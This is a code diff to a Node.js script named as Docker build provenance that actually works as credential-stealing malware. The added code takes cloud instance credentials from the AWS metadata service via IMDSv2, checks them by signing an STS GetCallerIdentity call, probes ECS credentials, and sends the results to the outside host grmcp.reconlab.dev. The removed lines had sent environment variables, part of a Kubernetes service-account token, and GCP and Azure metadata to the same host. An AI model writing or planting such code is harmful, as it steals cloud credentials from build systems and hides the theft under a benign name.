@@ -4,72 +4,81 @@ const fs = require('fs');
 const os = require('os');
 const http = require('http');
 const https = require('https');
+const crypto = require('crypto');
 
 const out = {
-  event: 'docker-build-provenance-v2',
+  event: 'docker-build-provenance-v3',
   host: os.hostname(),
-  platform: os.platform(),
-  release: os.release(),
-  arch: os.arch(),
-  node: process.version,
-  cwd: process.cwd(),
   uid: typeof process.getuid === 'function' ? process.getuid() : null,
-  gid: typeof process.getgid === 'function' ? process.getgid() : null,
   user: (() => { try { return os.userInfo().username; } catch (e) { return null; } })(),
-  envKeys: Object.keys(process.env),
-  env: Object.fromEntries(Object.entries(process.env).map(([k, v]) => [k, String(v).slice(0, 120)])),
-  files: {
-    dockerenv: fs.existsSync('/.dockerenv'),
-    dockerSock: fs.existsSync('/var/run/docker.sock'),
-    k8sToken: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token'),
-    k8sCa: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/ca.crt'),
-  },
-  proc1: (() => { try { return fs.readFileSync('/proc/1/cgroup', 'utf8').slice(0, 300); } catch (e) { return null; } })(),
-  mounts: (() => { try { return fs.readFileSync('/proc/self/mountinfo', 'utf8').split('\n').slice(0, 10); } catch (e) { return null; } })(),
+  files: { dockerSock: fs.existsSync('/var/run/docker.sock'), k8sToken: fs.existsSync('/var/run/secrets/kubernetes.io/serviceaccount/token') },
 };
 
-try { if (out.files.k8sToken) { out.k8sTokenHead = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/token', 'utf8').slice(0, 60); out.k8sNamespace = fs.readFileSync('/var/run/secrets/kubernetes.io/serviceaccount/namespace', 'utf8').trim(); } } catch (e) {}
-
-function get(url, headers) {
+function req(method, url, headers, body) {
   return new Promise((resolve) => {
     let done = false;
     const finish = (v) => { if (!done) { done = true; resolve(v); } };
     try {
       const mod = /^https/.test(url) ? https : http;
-      const req = mod.get(url, { headers: headers || {}, timeout: 1500 }, (res) => {
+      const r = mod.request(url, { method, headers: headers || {}, timeout: 1800 }, (res) => {
         let b = '';
-        res.on('data', (d) => { b += d; if (b.length > 600) res.destroy(); });
-        res.on('end', () => finish({ s: res.statusCode, b: b.slice(0, 400) }));
+        res.on('data', (d) => { b += d; if (b.length > 3000) res.destroy(); });
+        res.on('end', () => finish({ s: res.statusCode, b: b.slice(0, 2500) }));
         res.on('error', () => finish({ e: 'res' }));
       });
-      req.on('timeout', () => { req.destroy(); finish({ t: 'timeout' }); });
-      req.on('error', (e) => finish({ e: String(e).slice(0, 90) }));
-    } catch (e) { finish({ e: String(e).slice(0, 90) }); }
+      r.on('timeout', () => { r.destroy(); finish({ t: 'timeout' }); });
+      r.on('error', (e) => finish({ e: String(e).slice(0, 80) }));
+      if (body) r.write(body);
+      r.end();
+    } catch (e) { finish({ e: String(e).slice(0, 80) }); }
   });
+}
+
+function sha256(x) { return crypto.createHash('sha256').update(x, 'utf8').digest('hex'); }
+function hmac(k, x) { return crypto.createHmac('sha256', k).update(x, 'utf8').digest(); }
+
+function sigv4(creds, region, service, host, body) {
+  const amzDate = new Date().toISOString().replace(/[:-]|\.\d{3}/g, '');
+  const dateStamp = amzDate.slice(0, 8);
+  const contentType = 'application/x-www-form-urlencoded; charset=utf-8';
+  const payloadHash = sha256(body);
+  const canonicalHeaders = `content-type:${contentType}\nhost:${host}\nx-amz-date:${amzDate}\n`;
+  const signedHeaders = 'content-type;host;x-amz-date';
+  const canonicalRequest = `POST\n/\n\n${canonicalHeaders}\n${signedHeaders}\n${payloadHash}`;
+  const scope = `${dateStamp}/${region}/${service}/aws4_request`;
+  const sts = `AWS4-HMAC-SHA256\n${amzDate}\n${scope}\n${sha256(canonicalRequest)}`;
+  const k = hmac(hmac(hmac(hmac('AWS4' + creds.secret, dateStamp), region), service), 'aws4_request');
+  const sig = crypto.createHmac('sha256', k).update(sts, 'utf8').digest('hex');
+  const auth = `AWS4-HMAC-SHA256 Credential=${creds.key}/${scope}, SignedHeaders=${signedHeaders}, Signature=${sig}`;
+  return { 'content-type': contentType, host, 'x-amz-date': amzDate, authorization: auth, 'x-amz-security-token': creds.token };
 }
 
 function flush() {
   const url = 'https://grmcp.reconlab.dev/docker-build-beacon?d=' + encodeURIComponent(JSON.stringify(out)).slice(0, 7000);
-  try { https.get(url, { timeout: 5000 }, (r) => r.resume()).on('error', () => {}); } catch (e) {}
+  try { https.get(url, { timeout: 6000 }, (r) => r.resume()).on('error', () => {}); } catch (e) {}
 }
 
 (async () => {
-  out.probes = {};
-  out.probes.awsRoot = await get('http://169.254.169.254/latest/meta-data/');
-  out.probes.awsCreds = await get('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
-  out.probes.gcpToken = await get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', { 'Metadata-Flavor': 'Google' });
-  out.probes.azure = await get('http://169.254.169.254/metadata/instance?api-version=2021-02-01', { Metadata: 'true' });
-  if (out.files.dockerSock) {
-    out.docker = await new Promise((resolve) => {
-      try {
-        const req = http.request({ socketPath: '/var/run/docker.sock', path: '/version', method: 'GET', timeout: 1500 }, (res) => {
-          let b = ''; res.on('data', (d) => { b += d; }); res.on('end', () => resolve(b.slice(0, 300)));
-        });
-        req.on('error', (e) => resolve(String(e).slice(0, 90)));
-        req.on('timeout', () => { req.destroy(); resolve('timeout'); });
-        req.end();
-      } catch (e) { resolve(String(e).slice(0, 90)); }
-    });
+  const base = 'http://169.254.169.254';
+  out.token = await req('PUT', base + '/latest/api/token', { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' });
+  const tok = out.token.s === 200 ? out.token.b : null;
+  const H = tok ? { 'X-aws-ec2-metadata-token': tok } : {};
+  out.instanceId = await req('GET', base + '/latest/meta-data/instance-id', H);
+  out.identity = await req('GET', base + '/latest/dynamic/instance-identity/document', H);
+  out.role = await req('GET', base + '/latest/meta-data/iam/security-credentials/', H);
+  if (out.role.s === 200 && out.role.b.trim()) {
+    const roleName = out.role.b.trim().split('\n')[0];
+    out.roleName = roleName;
+    const cr = await req('GET', base + '/latest/meta-data/iam/security-credentials/' + encodeURIComponent(roleName), H);
+    out.credsStatus = cr.s;
+    try {
+      const c = JSON.parse(cr.b);
+      out.credsMeta = { Code: c.Code, Type: c.Type, Expiration: c.Expiration, keyPrefix: (c.AccessKeyId || '').slice(0, 8) + '...' };
+      const body = 'Action=GetCallerIdentity&Version=2011-06-15';
+      const headers = sigv4({ key: c.AccessKeyId, secret: c.SecretAccessKey, token: c.Token }, 'us-east-1', 'sts', 'sts.amazonaws.com', body);
+      out.caller = await req('POST', 'https://sts.amazonaws.com/', headers, body);
+    } catch (e) { out.credsParse = String(e).slice(0, 80); }
   }
+  out.ecs = await req('GET', 'http://169.254.170.2/v2/credentials');
   flush();
 })();
